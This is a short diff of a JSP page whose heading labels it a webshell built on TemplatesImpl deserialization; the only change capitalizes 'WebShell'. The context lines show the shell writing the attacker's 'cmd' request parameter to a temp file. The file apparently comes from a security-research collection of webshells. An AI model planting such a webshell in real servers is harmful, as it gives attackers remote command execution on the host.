@@ -8,7 +8,7 @@
 <%@ page import="java.io.File" %>
 <html>
 <body>
-<h2>利用TemplatesImpl反序列化的JSP Webshell</h2>
+<h2>利用TemplatesImpl反序列化的JSP WebShell</h2>
 <%
     String tmp = System.getProperty("java.io.tmpdir");
     Files.write(Paths.get(tmp + File.separator + "cmd"), request.getParameter("cmd").getBytes());
